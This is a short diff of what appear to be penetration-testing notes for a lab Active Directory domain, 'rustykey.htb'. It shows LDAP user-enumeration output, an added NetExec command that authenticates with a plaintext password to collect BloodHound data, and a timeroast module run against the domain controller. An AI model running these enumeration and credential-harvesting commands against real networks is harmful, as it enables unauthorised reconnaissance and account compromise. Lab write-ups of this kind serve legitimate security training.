@@ -39,6 +39,9 @@ LDAP        10.10.11.75     389    DC               ee.reed                     
 LDAP        10.10.11.75     389    DC               nn.marcos                     2024-12-27 06:34:50 0
 LDAP        10.10.11.75     389    DC               backupadmin                   2024-12-29 19:30:18 0
 ---
+ff nxc ldap 10.10.11.75 -d rustykey.htb -u 'rr.parker' -p '8#t5HE8L!W3A' --dns-server 10.10.11.75 -k --bloodhound -c All
+
+---
 ff nxc smb 10.10.11.75 -d rustykey.htb -u 'rr.parker'  -k -M timeroast
 ntpdig: no eligible servers
 SMB         10.10.11.75     445    10.10.11.75      [*]  x64 (name:10.10.11.75) (domain:10.10.11.75) (signing:True) (SMBv1:False) (NTLM:False)
